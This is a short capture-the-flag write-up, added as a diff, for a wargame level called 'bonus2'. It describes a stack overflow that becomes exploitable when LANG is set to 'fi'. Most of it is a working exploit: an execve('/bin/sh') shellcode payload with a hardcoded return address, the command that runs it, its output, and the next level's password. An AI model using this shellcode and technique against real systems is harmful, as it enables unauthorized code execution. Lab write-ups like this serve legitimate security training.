@@ -1,0 +1,30 @@
+The program take two args, the first is the username the second is not used, just fill buffer,
+i will use them both to overflow the message buffer and change eip to the shellcode in the av[1].
+
+using only the buffers can only reache 4 bytes of eip address,
+the program read the LANG env and do things following its content,
+
+0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
+…
+0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d
+…
+ 0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
+…
+0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740
+…
+0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
+
+0x804873d:	 "fi"
+0x8048740:	 "nl"
+
+by using fi in LANG env the program fill more stack in greetuser function that push the starting point of the output buffer up, and i can now overwrite the return address,
+
+/home/user/bonus2/bonus2 `python -c "print('\x90'*12+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"` AAAABBBBCCCCDDDDEE`python -c "print('\x50\xf6\xff\xbf')"`
+
+Hyvää päivää ������������1�Ph//shh/bin����°
+                                            ̀1�@̀AAAABBBBCCCCDDDDEEP���
+
+
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
